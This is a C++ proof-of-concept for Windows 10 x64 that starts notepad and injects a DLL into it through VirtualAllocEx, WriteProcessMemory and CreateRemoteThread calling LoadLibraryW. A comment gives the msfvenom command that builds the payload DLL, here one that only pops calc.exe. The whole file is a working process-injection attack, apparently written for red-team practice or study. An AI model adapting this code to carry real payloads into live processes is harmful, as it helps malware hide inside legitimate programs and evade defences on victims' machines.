// Windows 10 x64 
// Spawn notepad, inject dll into notepad process to pop calc
// Uses CreateRemoteThread.  Will be blocked by Defender (default meterp template)


#include <iostream>
#include <windows.h>


int start_notepad()
{
    STARTUPINFO info;
    PROCESS_INFORMATION processInfo;


    ZeroMemory(&info, sizeof(info));
    info.cb = sizeof(info);


    LPCWSTR appname = L"C:\\windows\\system32\\notepad.exe";
    BOOL retval = CreateProcess(appname, NULL, NULL, NULL,
        TRUE, 0, NULL, NULL, &info, &processInfo);


    if (retval == FALSE)
    {
        MessageBox(HWND_DESKTOP, L"Couldn't start notepad", L"UH OH SPAGHETTIOS", MB_OK);
        return -1;
    }


    // get pid 
    int pid = processInfo.dwProcessId;


    CloseHandle(processInfo.hProcess);
    CloseHandle(processInfo.hThread);

    return pid;

}


int main()
{
    // start notepad process to inject into
    int process_id = start_notepad();
    if (process_id == -1)
        return 1;


    printf("Started notepad with pid %d\n", process_id);


    // msfvenom -p windows/x64/exec CMD=calc.exe -b '\x00\x0A\x0D' -f dll -o mscalc64.dll exitfunc=thread 
    WCHAR dll_path[] = TEXT("C:\\windows\\system32\\mscalc64.dll");


    HANDLE notepad_handle;
    PVOID memory_buffer;


    // Get handle to notepad process
    notepad_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_id);
    if (notepad_handle == NULL)
    {
        printf("Failed to get handle to notepad process\n");
        return -1;
    }
    else {
        printf("Got handle to notepad...\n");
    }


    // Allocate memory region for dll string
    memory_buffer = VirtualAllocEx(notepad_handle, NULL, sizeof(dll_path), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (memory_buffer == NULL)
    {
        printf("Failed to allocate memory in notepad\n");
        return -1;
    }
    else {
        printf("Allocated buffer in notepad process at addr 0x%p\n", memory_buffer);
    }


    // Write dll name string into process
    printf("Injecting DLL name into notepad process...\n");
    WriteProcessMemory(notepad_handle, (LPVOID)memory_buffer, (LPCVOID)dll_path, sizeof(dll_path), 0);

    // Get address of LoadLibraryW
    PTHREAD_START_ROUTINE threadStartRoutineAddress = (PTHREAD_START_ROUTINE) GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");

    // Call LoadLibraryW to load dll into memory and execute
    printf("Executing injected dll as new thread...\n");
    CreateRemoteThread(notepad_handle, NULL, 0, threadStartRoutineAddress, memory_buffer, NULL, NULL);


    printf("Injection Complete\n");

    return 0;

}
